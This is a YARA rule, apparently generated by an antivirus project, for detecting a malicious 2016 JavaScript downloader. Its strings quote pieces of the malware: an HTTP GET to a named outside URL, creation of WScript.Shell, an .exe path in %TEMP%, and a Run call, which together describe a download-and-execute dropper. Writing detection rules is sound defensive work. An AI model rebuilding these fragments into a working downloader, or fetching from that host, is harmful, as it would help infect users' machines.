rule sig_20160330_71fbff68aca118a27784aa3287dc95ae {
  meta:
    description = "datamaliciousorder - file 20160330_71fbff68aca118a27784aa3287dc95ae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d6291e7795868fdd4942bcd355c628b34b8f33a77693588edca510c1a8ca5e5b"

  strings:
    $s1  = "Y[FE](\"GET\", \"http://pure-line.com.pl/f6splw\", false);" fullword ascii
    $s2  = "function HJ(MV, S2){E = E * 1; return MV - S2;};" fullword ascii
    $s3  = "var F = function X() {return WScript[E0](\"WScript\"+\".Shell\");}(), OT = 11;" fullword ascii
    $s4  = "if (Y[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NW(){return S0 + \"\";};" fullword ascii
    $s6  = "function M() {return F[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"D37lyvHZ78NOxx.ex\" + \"e\";};" fullword ascii
    $s7  = "function S() {return ((BK == true) && (BK == C)) ? 1 : E;};" fullword ascii
    $s8  = "function B(LN){F[\"Run\"](LN, E, E);};" fullword ascii
    $s9  = "}while (CS);" fullword ascii
    $s10 = "function UC(YL) {var P = (1, 2, 3, 4, 5, YL); return P;};" fullword ascii
    $s11 = "var B1 = new this[\"Date\"]();" fullword ascii
    $s12 = "function LZ(){return E0;};" fullword ascii
    $s13 = "function M0()" fullword ascii
    $s14 = "function ND(){return 22;};" fullword ascii
    $s15 = "return HJ(HU, S1);" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "var X0 = false;" fullword ascii
    $s18 = "C = true; " fullword ascii
    $s19 = "var BK = false;" fullword ascii
    $s20 = "BK = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}